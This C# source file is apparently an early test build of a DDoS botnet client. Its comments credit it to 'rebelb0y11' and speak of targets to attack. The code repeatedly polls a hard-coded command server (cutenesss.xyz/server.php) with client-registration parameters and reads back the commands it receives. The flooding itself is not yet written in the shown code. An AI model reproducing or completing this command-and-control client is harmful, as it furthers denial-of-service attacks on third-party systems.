using System;
using System.Net;

namespace UnitTests
{
    class Program
    {
        static void Main(string[] args)
        {
            //Direct location of your server.php file.
            //This is mine, however i doubt ill actually have a target for you to attack. Use it as a test for the client. Most of the variables are the same. Use the default hash secret provided below.
            string ServerAddress = "http://cutenesss.xyz/server.php";

            //Proper Credit. This may be moved to another location, or it can be remade. Just keep the main idea.
            //Log("This software is based on DDOS by rebelb0y11. rebel.hgtti.com AND github.com/rebelb0y11/DDOS");

            //Log("Initializing Rebel's DDOS Client.");
            WebClient client = new WebClient();

            //Log("Starting the RunLoop. While running, Log Messages will be left to a minimal.");
            string Secret = "Rebelb0y11"; //A string to use as the version ID. My name is default. Use it for testing the client by my server.
            //string Hash = GetSha1(Secret).ToLower();

            //Log("The hash for this version is " + Hash);
            //Log("In future versions, this hash will be secret and enforced, to ensure that everyone is running the newest version.");
            int GetIterations = -1;
            string target = "";
            bool Loop = true; //I could break the loop, but id like to let the code finish.
            Console.WriteLine("Set varibles - No errors");
            while (Loop)
            {
                if (GetIterations == -1 || (target != "" && GetIterations > 9) || target == "")
                {
                    //Log("Asking the server for commands");
                    string paramaters = "?";

                    //Tells the server that this is a client, and not a web browser
                    if (paramaters == "?")
                        paramaters = paramaters + "isclient=true";
                    else
                        paramaters = paramaters + "&isclient=true";

                    //Analytical: Tells server this is a new client
                    //(Will probably be implemented in a newer version)
                    if (GetIterations == -1)
                    {
                        //Log("Telling the server this is a new client");
                        if (paramaters == "?")
                            paramaters = paramaters + "newclient=true";
                        else
                            paramaters = paramaters + "&newclient=true";
                    }
                    else
                    {
                        if (paramaters == "?")
                            paramaters = paramaters + "newclient=false";
                        else
                            paramaters = paramaters + "&newclient=false";
                    }

                    //Tells the server the security hash for this version.
                    /*
                    if (paramaters == "?")
                        paramaters = paramaters + "hash=" + Hash;
                    else
                        paramaters = paramaters + "&hash=" + Hash;
                        */
                    //Tells the server the client hash of this version. This will be used to protect the server from clients impersonating my own. Currently serves no real purpose.

                    string commands = "";
                    try
                    {
                        commands = client.DownloadString(ServerAddress + paramaters);
                    }
                    catch (WebException web)
                    {Console.WriteLine(web);}//TODO: Handle this Exception.

                    string comtrim = commands.Trim();
                    Console.WriteLine(comtrim);
                    Console.ReadKey();
                    if (comtrim == "Online")
                    {
                        Console.WriteLine("Woop!");
                        Console.ReadKey();
                       
                    }
                }
            }
        }
    }
}
